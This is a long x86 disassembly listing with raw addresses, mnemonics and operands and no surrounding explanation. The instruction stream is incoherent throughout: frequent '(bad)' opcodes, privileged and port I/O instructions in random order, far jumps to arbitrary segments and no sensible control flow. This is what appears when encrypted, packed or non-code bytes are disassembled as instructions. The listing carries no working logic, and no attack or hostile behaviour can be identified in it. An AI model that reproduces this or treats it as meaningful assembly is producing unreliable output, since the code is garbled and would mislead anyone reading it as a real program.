  4103ae:	mov    al,ds:0x54940e40
  4103b3:	sub    al,0x8a
  4103b5:	pop    eax
  4103b6:	mov    ch,0xa2
  4103b8:	std    
  4103b9:	arpl   WORD PTR [ebp-0xe],ax
  4103bc:	lods   eax,DWORD PTR ds:[esi]
  4103bd:	mov    bh,bh
  4103bf:	inc    edi
  4103c0:	xchg   ebp,eax
  4103c1:	sbb    ah,ch
  4103c3:	mov    ch,0x18
  4103c6:	mov    ebp,0x2b827d43
  4103cb:	jae    0x4103d7
  4103cd:	push   eax
  4103ce:	or     bl,0x79
  4103d1:	mov    ebx,0x70a2f31d
  4103d6:	and    esi,DWORD PTR [eax+0x9]
  4103d9:	jns    0x4103a5
  4103db:	sahf   
  4103dc:	xor    al,0xf2
  4103de:	jno    0x41038f
  4103e0:	ss mov edx,0x888b0c9
  4103e6:	pop    esi
  4103e7:	pop    ecx
  4103e8:	pop    esi
  4103e9:	xchg   edi,eax
  4103ea:	lods   eax,DWORD PTR ds:[esi]
  4103eb:	shr    DWORD PTR [esi-0x5d],1
  4103ee:	je     0x410423
  4103f0:	mov    bl,0x84
  4103f2:	(bad)  [edx]
  4103f4:	push   esp
  4103f5:	stos   DWORD PTR es:[edi],eax
  4103f6:	dec    DWORD PTR [ebp-0x4eda5e7e]
  4103fc:	aas    
  4103fd:	lea    edx,[ebp-0x56]
  410400:	or     al,0x54
  410402:	add    eax,0xb2bb32ba
  410407:	xor    BYTE PTR [ebp-0x71eca09],dh
  41040d:	(bad)  
  41040e:	push   eax
  41040f:	pop    ebx
  410410:	cwde   
  410411:	push   ecx
  410412:	fadd   QWORD PTR [ebp-0x48]
  410415:	int    0xcd
  410417:	and    ebx,DWORD PTR [eax-0x58]
  41041a:	adc    cl,BYTE PTR [esi+0x55523546]
  410420:	into   
  410421:	jo     0x4103f6
  410423:	sbb    DWORD PTR [edi+0x12],ebp
  410426:	and    al,0x4
  410428:	shr    BYTE PTR [ecx+ecx*2+0x53],0x34
  41042d:	mov    al,ds:0x92746a89
  410432:	adc    ch,ah
  410434:	adc    BYTE PTR [eax],dh
  410436:	jge    0x410451
  410438:	or     esp,ecx
  41043a:	std    
  41043b:	xchg   ecx,eax
  41043c:	add    eax,0xd0f98c9
  410441:	push   0xffffffa1
  410443:	jmp    DWORD PTR [edi-0x8]
  410446:	lahf   
  410447:	pop    eax
  410448:	inc    ebx
  410449:	ficom  DWORD PTR [eax+0x97cd672]
  41044f:	mov    dl,0x46
  410451:	cmc    
  410452:	rol    dl,0xd2
  410455:	push   0x18
  410457:	xor    al,0x7
  410459:	dec    ebp
  41045a:	push   edx
  41045b:	lods   al,BYTE PTR ds:[esi]
  41045c:	jmp    0xfb73:0xe92d2e6a
  410463:	ins    BYTE PTR es:[edi],dx
  410464:	fisttp QWORD PTR fs:[edx-0x53]
  410468:	scas   al,BYTE PTR es:[edi]
  410469:	mov    ecx,ebx
  41046b:	les    esp,FWORD PTR [edi-0x37c32e08]
  410471:	dec    edi
  410472:	or     al,0x18
  410474:	dec    esi
  410475:	fiadd  WORD PTR [ecx+0x20]
  410478:	or     ah,BYTE PTR [edi-0x50238b51]
  41047e:	rol    BYTE PTR [edx+0x6d],1
  410481:	(bad)  
  410482:	jmp    0x19844686
  410487:	push   ss
  410488:	imul   eax,ebp,0xa03b5871
  41048e:	or     al,0x9b
  410490:	mov    bl,0x7d
  410492:	das    
  410493:	xchg   ecx,eax
  410494:	cs fs jbe 0x41048d
  410498:	inc    esi
  410499:	lahf   
  41049a:	ss push edx
  41049c:	fmul   st(7),st
  41049e:	inc    ebx
  41049f:	fisttp DWORD PTR [ebx+0x20]
  4104a2:	(bad)  
  4104a3:	jns    0x4104e9
  4104a5:	lock loop 0x41044b
  4104a8:	dec    eax
  4104aa:	shl    DWORD PTR [eax+0x55],1
  4104ad:	ss aaa 
  4104af:	mov    ds:0xafe012f0,al
  4104b4:	iret   
  4104b5:	and    al,0xfe
  4104b7:	imul   edx,DWORD PTR ds:0xe490a95f,0xffffffbc
  4104be:	cwde   
  4104bf:	cdq    
  4104c0:	push   cs
  4104c1:	xchg   ebx,eax
  4104c2:	dec    ecx
  4104c3:	push   0x71c3bb93
  4104c8:	fadd   DWORD PTR [ebp+0x7a]
  4104cb:	clc    
  4104cc:	sbb    eax,0xd41bfaea
  4104d1:	fcom   DWORD PTR [ecx+ecx*8+0x51]
  4104d5:	mov    cl,0x94
  4104d7:	ja     0x410519
  4104d9:	in     al,0xa6
  4104db:	call   0x9601291a
  4104e0:	add    cl,BYTE PTR [di+0x7ccf]
  4104e5:	(bad)  
  4104e6:	mov    WORD PTR [ebp-0x31],?
  4104e9:	dec    ebp
  4104ea:	test   al,0x60
  4104ec:	enter  0xd331,0xae
  4104f0:	adc    edx,ebx
  4104f2:	adc    BYTE PTR [edi],bh
  4104f4:	out    0x53,al
  4104f6:	xchg   ecx,eax
  4104f7:	fmul   st,st(1)
  4104f9:	xor    al,0x1c
  4104fb:	invd   
  4104fd:	call   0xb720:0xa98587fc
  410504:	or     ebp,DWORD PTR [edx+edx*8+0x5b97218c]
  41050b:	jnp    0x410529
  41050d:	xor    eax,0xbdd42b1b
  410512:	retf   
  410513:	xor    DWORD PTR [ebp+0x410e6aba],esp
  410519:	rcr    esi,0x55
  41051c:	popf   
  41051d:	push   edx
  41051e:	or     eax,DWORD PTR [edi+0x3f0ca970]
  410524:	aad    0x6a
  410526:	ret    0x1a26
  410529:	cli    
  41052a:	push   0xacacef3a
  41052f:	sar    BYTE PTR [edx+0x65],0x9b
  410533:	fild   QWORD PTR [edi]
  410535:	xor    al,BYTE PTR [ebp+0x1b871afa]
  41053b:	pop    esi
  41053c:	clc    
  41053d:	dec    ecx
  41053e:	and    DWORD PTR [ecx-0x8],ecx
  410541:	scas   al,BYTE PTR es:[edi]
  410542:	js     0x410547
  410544:	out    dx,eax
  410545:	pop    ebp
  410546:	fdiv   st(3),st
  410548:	mov    bh,0x84
  41054a:	xchg   ecx,eax
  41054b:	jle    0x41058d
  41054d:	out    0xff,al
  41054f:	rcl    DWORD PTR [edi],1
  410551:	fild   DWORD PTR [esi-0x11]
  410554:	mov    ds:0xd6b4ee60,al
  410559:	xchg   ebp,eax
  41055a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41055b:	mov    dh,0xb4
  41055d:	mov    ds,WORD PTR [esi]
  41055f:	or     al,0x52
  410561:	inc    ebx
  410562:	inc    esp
  410563:	cli    
  410564:	iret   
  410565:	xchg   cl,ah
  410567:	test   DWORD PTR [edx],0xfec0176a
  41056d:	jl     0x410546
  41056f:	mov    al,ds:0xa4ab8a17
  410574:	sti    
  410575:	std    
  410576:	fnsave [ebp+eax*1+0x30bd3017]
  41057d:	jmp    0x41059f
  41057f:	data16 mov cl,0x9f
  410582:	retf   
  410583:	retf   
  410584:	mov    WORD PTR [esi+0x6176e3a7],fs
  41058a:	ja     0x410560
  41058c:	fist   WORD PTR [esi+ebx*2+0x6e]
  410590:	cmp    eax,0x69c8d382
  410595:	sub    cl,al
  410597:	mov    eax,0x5be44c65
  41059c:	jns    0x4105a2
  41059e:	int    0xa2
  4105a0:	mov    ch,0x6
  4105a2:	enter  0x98d3,0x5a
  4105a6:	xor    al,0x28
  4105a8:	gs inc ebp
  4105aa:	mov    edi,DWORD PTR [edi+0x65]
  4105ad:	sbb    edi,eax
  4105af:	les    ebp,FWORD PTR [eax]
  4105b1:	mov    ebp,0x41b2abc3
  4105b6:	pop    edx
  4105b7:	pop    ecx
  4105b8:	in     al,dx
  4105b9:	(bad)  
  4105ba:	out    0xfe,al
  4105bc:	(bad)  
  4105bd:	cld    
  4105be:	pop    esp
  4105bf:	mov    al,ch
  4105c1:	pop    edx
  4105c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105c3:	fiadd  DWORD PTR [esi]
  4105c5:	xor    DWORD PTR [esi+0x1a],esi
  4105c8:	outs   dx,DWORD PTR ds:[esi]
  4105c9:	jp     0x410594
  4105cb:	dec    eax
  4105cc:	mov    cl,0x8e
  4105ce:	jns    0x41062d
  4105d0:	cdq    
  4105d1:	(bad)  
  4105d2:	lock xor cl,BYTE PTR [ecx-0x206c8fea]
  4105d9:	xchg   edi,eax
  4105da:	pop    esi
  4105db:	ja     0x4105e5
  4105dd:	sub    al,0xf4
  4105df:	loope  0x4105c8
  4105e1:	or     al,bl
  4105e3:	and    al,0xbb
  4105e5:	fs xchg edx,eax
  4105e7:	mov    esi,0x35947f87
  4105ec:	or     DWORD PTR [ebp+0x21],0xffffffbb
  4105f0:	ror    esi,0xe3
  4105f3:	mov    ebp,0x5d79326c
  4105f8:	jg     0x410628
  4105fa:	mov    edx,0x34add244
  4105ff:	xchg   esp,eax
  410600:	push   es
  410601:	xchg   edi,ecx
  410603:	es loopne 0x410659
  410606:	sub    BYTE PTR [ecx+0x75726c18],bl
  41060c:	push   eax
  41060d:	rol    dh,cl
  41060f:	lods   eax,DWORD PTR ds:[esi]
  410610:	repnz ss sti 
  410613:	fdiv   st,st(4)
  410615:	adc    edi,edx
  410617:	fs jno 0x410680
  41061a:	loop   0x41059e
  41061c:	out    dx,al
  41061d:	pusha  
  41061e:	jae    0x410660
  410620:	das    
  410621:	push   esi
  410622:	xchg   esp,eax
  410623:	in     eax,0x46
  410625:	fild   WORD PTR [esi+0x17ff8a9d]
  41062b:	mov    ss:0x5f6a9a0e,eax
  410631:	pop    ebp
  410632:	jb     0x4105dd
  410634:	out    dx,al
  410635:	popf   
  410636:	rol    DWORD PTR [edx-0x25],cl
  410639:	inc    edx
  41063a:	fucomp st(5)
  41063c:	cli    
  41063d:	(bad)  
  41063e:	lods   al,BYTE PTR ds:[esi]
  41063f:	aad    0xfc
  410641:	cmp    DWORD PTR [ebx],edx
  410643:	in     al,0x6d
  410645:	push   0x71
  410647:	add    eax,0x557749c3
  41064c:	mov    al,0x74
  41064e:	test   DWORD PTR [ecx],ebx
  410650:	les    ebp,FWORD PTR [edi-0x312d46f5]
  410656:	mov    dh,al
  410658:	mov    ah,0x3d
  41065a:	test   ch,0x38
  41065d:	in     al,0x14
  41065f:	(bad)  
  410660:	arpl   dx,di
  410662:	or     BYTE PTR [ebp-0x4b],al
  410665:	xchg   DWORD PTR [edi+0x45],esi
  410668:	dec    ecx
  410669:	adc    al,0xd9
  41066b:	sbb    BYTE PTR [ebp-0xa0b856a],bh
  410671:	sub    al,0xbc
  410673:	mov    esi,0xcf28b192
  410678:	in     eax,dx
  410679:	mov    ah,0x97
  41067b:	xor    eax,0xdc2e3e0
  410680:	scas   eax,DWORD PTR es:[edi]
  410681:	pop    esp
  410682:	dec    edx
  410683:	(bad)  
  410684:	iret   
  410685:	ja     0x4106d8
  410687:	adc    edx,DWORD PTR [esi]
  410689:	sub    eax,0xaf238463
  41068e:	jl     0x410618
  410690:	iret   
  410691:	and    ch,BYTE PTR [ecx+0x13]
  410694:	pop    ds
  410695:	int    0xb0
  410697:	push   0xde4afb4d
  41069c:	retf   0xf73d
  41069f:	popa   
  4106a0:	sbb    eax,DWORD PTR fs:[edx-0x5d99d807]
  4106a7:	jbe    0x4106d5
  4106a9:	dec    edi
  4106aa:	xchg   DWORD PTR [esp+ecx*2+0x6426f729],eax
  4106b1:	and    esp,eax
  4106b3:	in     al,0xdd
  4106b5:	(bad)  
  4106b7:	mov    ch,BYTE PTR ds:0x6d2bc23e
  4106bd:	mov    eax,ds:0x1a8a6e6a
  4106c2:	js     0x410654
  4106c4:	dec    ebp
  4106c5:	fistp  WORD PTR [edx]
  4106c7:	data16 cmp BYTE PTR [ebx-0x29],cl
  4106cb:	adc    al,0x5a
  4106cd:	fidivr WORD PTR [esi-0x459260c9]
  4106d3:	pushf  
  4106d4:	mov    ds:0xa0a83307,al
  4106d9:	mov    cl,0xef
  4106db:	les    ecx,FWORD PTR [ebp+0x23]
  4106de:	dec    edx
  4106df:	fmul   DWORD PTR [eax+edi*4-0x6472ce04]
  4106e6:	test   al,0x43
  4106e8:	retf   0xa61
  4106eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106ec:	pop    ds
  4106ed:	or     bl,BYTE PTR [eax]
  4106ef:	icebp  
  4106f0:	mov    dl,0xd1
  4106f2:	test   al,0x7a
  4106f4:	int    0x89
  4106f6:	jp     0x4106cd
  4106f8:	pop    edx
  4106f9:	adc    dl,BYTE PTR ss:[bx+si+0x6a2f]
  4106ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410700:	pop    ebx
  410701:	xchg   esi,eax
  410703:	fstp   TBYTE PTR [edx-0x387b0f26]
  410709:	ins    DWORD PTR es:[edi],dx
  41070a:	jo     0x4106ba
  41070c:	jg     0x41068e
  41070e:	std    
  41070f:	push   ebx
  410710:	loope  0x4106a0
  410712:	adc    ebx,esp
  410714:	imul   ecx,DWORD PTR [esi],0xd355a47d
  41071a:	add    ecx,ecx
  41071c:	clc    
  41071d:	mov    ch,0xe2
  41071f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410720:	(bad)  
  410722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410723:	pop    ecx
  410724:	sbb    BYTE PTR [ecx+ecx*1+0x5c],dh
  410728:	mov    edi,0x2909ab6d
  41072d:	out    0x7c,eax
  41072f:	adc    BYTE PTR [edx+0x61],0x6f
  410733:	sahf   
  410734:	aad    0xf0
  410736:	mov    esp,0x8585b3aa
  41073b:	mov    DWORD PTR [ebx+0x3c],esi
  41073e:	push   eax
  41073f:	inc    edi
  410740:	sub    eax,0x94759e40
  410745:	cwde   
  410746:	cmp    DWORD PTR [esi+0x6c23b272],ebp
  41074c:	mov    dl,0x65
  41074e:	sbb    DWORD PTR [eax-0x4b],ecx
  410751:	mov    WORD PTR [esi],cs
  410753:	imul   bh
  410755:	repz jbe 0x410749
  410758:	jp     0x410764
  41075a:	(bad)  
  41075c:	and    ebp,DWORD PTR [edx+0x7d6f5e70]
  410762:	mov    ebp,0xd97a1c63
  410767:	mov    cl,0x33
  410769:	sub    al,0xa1
  41076b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41076c:	(bad)  
  41076d:	sbb    al,0x33
  41076f:	daa    
  410770:	(bad)  
  410771:	and    eax,0x148ff1a2
  410776:	bnd jp 0x4107ed
  410779:	fistp  QWORD PTR [ebx+0x8]
  41077c:	popf   
  41077d:	jge    0x410747
  41077f:	sub    eax,0x6d27a655
  410784:	cdq    
  410785:	faddp  st(2),st
  410787:	cmc    
  410788:	inc    edx
  410789:	jp     0x410721
  41078b:	adc    BYTE PTR [eax-0x43b957c8],dl
  410791:	ins    BYTE PTR es:[edi],dx
  410792:	popa   
  410793:	cmc    
  410794:	gs mov esp,0x4d30d1ba
  41079a:	add    BYTE PTR [ecx-0x55],ah
  41079d:	sar    DWORD PTR [eax+eiz*4-0x4c],0xc1
  4107a2:	mov    al,ds:0xf7798e1
  4107a7:	psrlw  mm2,mm3
  4107aa:	neg    BYTE PTR [ebx-0x45]
  4107ad:	mov    bl,0x29
  4107af:	out    dx,eax
  4107b0:	add    eax,0xc5d1a90f
  4107b5:	mov    edi,0x6af423b6
  4107ba:	mov    bh,0xdc
  4107bc:	push   0x48
  4107be:	daa    
  4107bf:	xchg   DWORD PTR [ebp+0x65],ebx
  4107c2:	imul   esi,DWORD PTR [esi+0x65a5f618],0xb200ab19
  4107cc:	push   ss
  4107cd:	mov    esi,es
  4107cf:	dec    eax
  4107d0:	(bad)  
  4107d1:	(bad)  
  4107d3:	nop
  4107d4:	mov    al,0x9a
  4107d6:	repnz hlt 
  4107d8:	pop    ebp
  4107d9:	push   ecx
  4107da:	(bad)  
  4107dc:	fist   WORD PTR [eax-0x5b68dbd0]
  4107e2:	jg     0x410802
  4107e4:	clc    
  4107e5:	cdq    
  4107e6:	pusha  
  4107e7:	push   0x48
  4107e9:	out    0xdc,al
  4107eb:	adc    al,0xe1
  4107ed:	cwde   
  4107ee:	bswap  edi
  4107f0:	push   ss
  4107f1:	pmuludq mm6,QWORD PTR [edi+esi*1]
  4107f5:	into   
  4107f6:	mov    ecx,0xfb668948
  4107fb:	mov    bl,0xa3
  4107fd:	out    dx,al
  4107fe:	xchg   edx,eax
  4107ff:	push   ebx
  410800:	hlt    
  410801:	dec    ebp
  410802:	mov    eax,0x5488e27a
  410807:	cdq    
  410808:	xlat   BYTE PTR ds:[ebx]
  410809:	data16 (bad) 
  41080b:	adc    DWORD PTR [ebp+0x60],edi
  41080e:	(bad)  
  41080f:	nop
  410810:	out    0xc5,al
  410812:	ficomp DWORD PTR [edi+0x33]
  410815:	pusha  
  410816:	inc    ebp
  410817:	inc    esi
  410818:	push   edx
  410819:	sub    DWORD PTR [edx],ebp
  41081b:	test   eax,0x7c0e9baf
  410820:	fisub  DWORD PTR [ebx]
  410822:	call   0x3e12:0xe2b9d2b0
  410829:	and    al,0xbc
  41082b:	and    edx,0x46d09535
  410831:	cmp    eax,0x560bc7c0
  410836:	popf   
  410837:	outs   dx,DWORD PTR ds:[esi]
  410838:	or     BYTE PTR [edx],bh
  41083a:	arpl   WORD PTR [esi],bx
  41083c:	in     al,dx
  41083d:	jge    0x410885
  41083f:	pop    esi
  410840:	in     al,0x1d
  410842:	call   0xd6662f61
  410847:	or     BYTE PTR [ecx],al
  410849:	cli    
  41084a:	enter  0xa9de,0xde
  41084e:	cmp    edx,0xffffff92
  410851:	dec    esi
  410852:	nop
  410853:	jl     0x4107fd
  410855:	push   esi
  410856:	fistp  DWORD PTR [ebx]
  410858:	mov    ecx,0x179db6c0
  41085d:	in     eax,dx
  41085e:	dec    esp
  41085f:	mov    ss,ecx
  410861:	mov    edi,0x8134ca83
  410866:	push   edx
  410867:	inc    ebp
  410868:	pop    ebx
  410869:	ds adc al,0x2d
  41086c:	push   ss
  41086d:	pop    edi
  41086e:	loopne 0x41080d
  410870:	inc    BYTE PTR [edi-0x1c]
  410873:	jmp    0xd92e:0xa746df95
  41087a:	jp     0x41081f
  41087c:	ja     0x410813
  41087e:	cs test dh,0xe
  410882:	or     ebx,DWORD PTR [eax]
  410884:	aad    0xbb
  410886:	add    BYTE PTR [ebp-0x1a5af29a],bl
  41088c:	in     eax,dx
  41088d:	leave  
  41088e:	bound  ebp,QWORD PTR [ecx-0x2]
  410891:	jnp    0x410825
  410893:	mov    edi,0xdba02a11
  410898:	cmp    al,bl
  41089a:	psllq  mm4,mm2
  41089d:	shl    DWORD PTR [ebx-0x1c8ef2e7],1
  4108a3:	adc    edx,esp
  4108a5:	xor    al,BYTE PTR [ebx-0xb]
  4108a8:	push   esp
  4108a9:	or     BYTE PTR [ecx-0x77fa5aaa],0x8c
  4108b0:	clc    
  4108b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108b2:	outs   dx,BYTE PTR ds:[esi]
  4108b3:	pop    eax
  4108b4:	mov    al,0x60
  4108b6:	lods   eax,DWORD PTR ds:[esi]
  4108b7:	jbe    0x9129feae
  4108bd:	cmp    bl,BYTE PTR [esi-0xa]
  4108c0:	pusha  
  4108c1:	repnz cmc 
  4108c3:	mov    DWORD PTR [ebp+0x15],eax
  4108c6:	adc    al,bh
  4108c8:	iret   
  4108c9:	mov    DWORD PTR [edx],esi
  4108cb:	cmp    dl,BYTE PTR [esi-0x83d5f11]
  4108d1:	sub    DWORD PTR [edi-0x4335a21],0x13
  4108d8:	not    DWORD PTR [ebp+0x19d98e48]
  4108de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108df:	mov    ebx,0x9f763ba0
  4108e4:	or     ah,BYTE PTR [edx-0x1220fcad]
  4108ea:	or     ch,bl
  4108ec:	icebp  
  4108ed:	and    edx,ecx
  4108ef:	test   al,0x9a
  4108f1:	outs   dx,BYTE PTR ds:[esi]
  4108f2:	dec    esp
  4108f3:	sbb    eax,0x904da2c3
  4108f8:	mov    dx,0x5c8f
  4108fc:	(bad)  
  4108fd:	xchg   BYTE PTR ds:0xc1984509,dl
  410903:	cmp    DWORD PTR [edi-0x5],edi
  410906:	pop    ecx
  410907:	sbb    esp,eax
  410909:	fdiv   DWORD PTR [ebp+0x5b0439e5]
  41090f:	sub    DWORD PTR [edx],esi
  410911:	push   0x21
  410913:	jmp    0x41092f
  410915:	pop    DWORD PTR [eax+0x48]
  410918:	aaa    
  410919:	pop    ebx
  41091a:	fld    DWORD PTR ds:0x1f153ab9
  410920:	sub    bh,cl
  410922:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410924:	adc    BYTE PTR [ecx-0x6b],ch
  410927:	(bad)  
  410929:	ins    DWORD PTR es:[edi],dx
  41092a:	shl    ebx,cl
  41092c:	jecxz  0x41098a
  41092e:	enter  0x645b,0xef
  410932:	jmp    0xd1b3:0xf9edb0b6
  410939:	xor    ch,bh
  41093b:	mov    ebp,0xa413795b
  410940:	gs inc ecx
  410942:	push   esi
  410943:	mov    ebx,0x2c8fc90f
  410948:	inc    edi
  410949:	stos   DWORD PTR es:[edi],eax
  41094a:	cwde   
  41094b:	test   BYTE PTR [ecx],cl
  41094d:	pop    ecx
  41094e:	out    dx,eax
  41094f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410950:	gs dec ebp
  410952:	jmp    0x649f:0xdc6deb21
  410959:	pop    ds
  41095a:	push   esi
  41095b:	mov    ds:0xd358887f,al
  410960:	data16 fadd st(0),st
  410963:	and    edx,DWORD PTR [ecx+0x6d1b7703]
  410969:	popf   
  41096a:	fwait
  41096b:	rcl    DWORD PTR [ecx-0x22],1
  41096e:	jmp    0x41099a
  410970:	mov    ebx,0xbd220a4
  410975:	and    al,0x37
  410977:	pusha  
  410978:	sub    esp,esi
  41097a:	xchg   esp,eax
  41097b:	hlt    
  41097c:	aas    
  41097d:	repz lahf 
  41097f:	out    dx,eax
  410980:	shl    ch,cl
  410982:	cld    
  410983:	adc    al,0x55
  410985:	sub    DWORD PTR [esi],edi
  410987:	mov    bl,0x96
  410989:	loope  0x4109a2
  41098b:	jbe    0x4109b5
  41098d:	hlt    
  41098e:	popa   
  41098f:	iret   
  410990:	push   cs
  410991:	mov    WORD PTR [ebx+ebp*1+0x79dade77],gs
  410998:	sbb    BYTE PTR [edx+0x352a2847],ah
  41099e:	push   esi
  41099f:	xchg   BYTE PTR [edx],ch
  4109a1:	xchg   si,ax
  4109a3:	cmp    cl,BYTE PTR [edx]
  4109a5:	push   esp
  4109a6:	stc    
  4109a7:	mov    cl,0x1a
  4109a9:	mov    eax,ds:0xa29bb354
  4109ae:	inc    ebp
  4109af:	mov    esp,eax
  4109b1:	pop    ss
  4109b2:	push   esp
  4109b3:	push   es
  4109b4:	cmp    al,0x23
  4109b6:	ret    
  4109b7:	mov    ch,0x1d
  4109b9:	fs es mov edi,0x1978b38c
  4109c0:	adc    ch,al
  4109c2:	sub    BYTE PTR [ebp-0x77d9e1c3],0xe7
  4109c9:	xor    eax,0x67a5088c
  4109ce:	xchg   esi,eax
  4109cf:	lods   al,BYTE PTR ds:[esi]
  4109d0:	shl    DWORD PTR [edi+0x56],cl
  4109d3:	ss add eax,0x3b9e5d82
  4109d9:	int3   
  4109da:	in     al,0xd6
  4109dc:	(bad)  
  4109dd:	push   ss
  4109de:	inc    DWORD PTR [edi-0x5f]
  4109e1:	dec    ebx
  4109e2:	psubusb mm5,mm1
  4109e5:	and    al,0x18
  4109e7:	stos   DWORD PTR es:[edi],eax
  4109e8:	int    0x99
  4109ea:	fwait
  4109eb:	xchg   ah,bh
  4109ed:	xchg   BYTE PTR [ecx-0x77aec1a6],ah
  4109f3:	xchg   BYTE PTR [ecx-0x66],dl
  4109f6:	push   es
  4109f7:	ins    DWORD PTR es:[edi],dx
  4109f8:	sbb    BYTE PTR [esi+ecx*8-0x71],bl
  4109fc:	mov    eax,ds:0xeb0fa05f
  410a01:	or     DWORD PTR [ecx+0x23250cf],ebp
  410a07:	dec    eax
  410a08:	inc    esi
  410a09:	test   eax,0x2e3c144a
  410a0e:	mov    esp,0x3369ceb6
  410a13:	jge    0x4109c7
  410a15:	push   edx
  410a16:	enter  0x593c,0xb7
  410a1a:	pop    esi
  410a1b:	jo     0x4109ea
  410a1d:	loop   0x4109df
  410a1f:	sbb    dh,BYTE PTR [esi]
  410a21:	outs   dx,BYTE PTR ds:[esi]
  410a22:	sti    
  410a23:	nop
  410a24:	mov    ah,0x2d
  410a26:	das    
  410a27:	rcr    DWORD PTR [eax-0x71896588],0xf8
  410a2e:	pusha  
  410a2f:	add    al,0x38
  410a31:	cwde   
  410a32:	mov    eax,0x2fd3949c
  410a37:	pop    esp
  410a38:	test   DWORD PTR [ecx+0x4],edx
  410a3b:	in     al,0xe8
  410a3d:	push   ebp
  410a3e:	dec    ebx
  410a3f:	sar    BYTE PTR [eax-0x6d6eec3a],cl
  410a45:	or     DWORD PTR ds:0xdd82e86c,edx
  410a4b:	pusha  
  410a4c:	xchg   ebp,eax
  410a4d:	add    esi,DWORD PTR [ebp-0x60]
  410a50:	pop    edi
  410a51:	cdq    
  410a52:	loop   0x4109f1
  410a54:	mov    edi,esi
  410a56:	enter  0xcad3,0x11
  410a5a:	pop    edx
  410a5b:	mov    cl,0x37
  410a5d:	outs   dx,DWORD PTR ds:[esi]
  410a5e:	adc    dh,BYTE PTR [eax]
  410a60:	ins    DWORD PTR es:[edi],dx
  410a61:	jne    0x410a29
  410a63:	popf   
  410a64:	cmp    al,0x24
  410a66:	sub    eax,0xb6ab4175
  410a6b:	lock loop 0x410ac3
  410a6e:	mov    edi,0x35e87ca4
  410a73:	cwde   
  410a74:	cs pop es
  410a76:	or     eax,0xe601c70e
  410a7b:	in     al,dx
  410a7c:	int3   
  410a7d:	lock jbe 0x410a85
  410a80:	adc    ch,BYTE PTR [edx-0x2a]
  410a83:	add    ebx,0xf15c4c41
  410a89:	(bad)  
  410a8a:	out    0x53,al
  410a8c:	lds    edi,FWORD PTR [edx+0x20bc63d7]
  410a92:	xor    DWORD PTR [ebx],edx
  410a94:	cmp    dh,BYTE PTR [ebp+0x705d783]
  410a9a:	rcl    DWORD PTR [edi],cl
  410a9c:	or     al,0xfe
  410a9e:	out    dx,al
  410a9f:	add    BYTE PTR [ecx-0x2e],ch
  410aa2:	cmp    ebx,eax
  410aa4:	xor    bl,dh
  410aa6:	sahf   
  410aa7:	xor    eax,0xf2becaaf
  410aac:	int    0x6f
  410aae:	xchg   DWORD PTR [eax-0x45dfb4f9],ecx
  410ab4:	jnp    0x410a50
  410ab6:	fmul   st,st(5)
  410ab8:	repz loopne 0x410a55
  410abb:	mov    bh,0xa5
  410abd:	sbb    al,dl
  410abf:	addr16 pop ds
  410ac1:	imul   esi,DWORD PTR [eax+0x2555409f],0xffffffdb
  410ac8:	push   0x371e7c86
  410acd:	sub    DWORD PTR [ebx-0xf],0xffffffa4
  410ad1:	aad    0x9f
  410ad3:	xchg   ecx,eax
  410ad4:	mov    bl,0x38
  410ad6:	fnstcw WORD PTR [ebp-0x55]
  410ad9:	div    ecx
  410adb:	sub    al,0x2b
  410add:	pop    edx
  410ade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410adf:	loop   0x410a76
  410ae1:	adc    ebp,ebp
  410ae3:	test   al,0x9b
  410ae5:	sbb    DWORD PTR [edx-0xa1aeea7],ebp
  410aeb:	inc    edi
  410aec:	jne    0x410b2f
  410aee:	into   
  410aef:	rcpps  xmm5,XMMWORD PTR [edi-0x67]
  410af3:	test   cl,ah
  410af5:	into   
  410af6:	push   esi
  410af7:	stos   DWORD PTR es:[edi],eax
  410af8:	pop    ebx
  410af9:	pop    esi
  410afa:	int3   
  410afb:	loop   0x410b1b
  410afd:	mov    ch,0x5e
  410aff:	add    ecx,eax
  410b01:	shl    DWORD PTR [edx],0x62
  410b04:	mov    ecx,0xb15c76ee
  410b09:	ds inc eax
  410b0b:	int    0xda
  410b0d:	jge    0x410ad8
  410b0f:	pop    eax
  410b10:	push   ebx
  410b11:	sub    dl,ch
  410b13:	mov    edx,DWORD PTR [eax-0x3c]
  410b16:	fs jb  0x410b77
  410b19:	cdq    
  410b1a:	outs   dx,BYTE PTR ds:[esi]
  410b1b:	pushf  
  410b1c:	or     eax,0x5d997971
  410b21:	test   al,0x29
  410b23:	jb     0x410b77
  410b25:	bound  ebp,QWORD PTR [edx]
  410b27:	jmp    0xdb9a:0x4f601b53
  410b2e:	jge    0x410b69
  410b30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b31:	aam    0x50
  410b33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b34:	adc    al,0x41
  410b36:	mov    cl,0x70
  410b38:	out    0xf8,eax
  410b3a:	sub    eax,0x34ee829f
  410b3f:	ds push es
  410b41:	dec    ecx
  410b42:	arpl   WORD PTR [eax+0x1d],di
  410b45:	jb     0x410b5b
  410b47:	xchg   ebp,eax
  410b48:	dec    eax
  410b49:	rcr    DWORD PTR [esi+0x1baafdd0],1
  410b4f:	xor    eax,0xc9c7ff6b
  410b54:	iret   
  410b55:	cmp    eax,0xff4dcd7c
  410b5a:	sbb    BYTE PTR [esi],cl
  410b5c:	popf   
  410b5d:	jbe    0x410adf
  410b5f:	shl    ch,0xc0
  410b62:	xor    bh,bh
  410b64:	clc    
  410b65:	and    DWORD PTR [eax+eiz*1],ebp
  410b68:	(bad)  
  410b6a:	xchg   ebp,eax
  410b6b:	dec    eax
  410b6c:	popf   
  410b6d:	and    DWORD PTR [eax+0x3db2b066],ebp
  410b73:	adc    al,0xfc
  410b75:	xchg   ebp,eax
  410b76:	dec    ebx
  410b77:	fisub  DWORD PTR [edx-0x7e]
  410b7a:	cmp    ch,al
  410b7c:	or     al,0x3e
  410b7e:	or     eax,DWORD PTR [ebx]
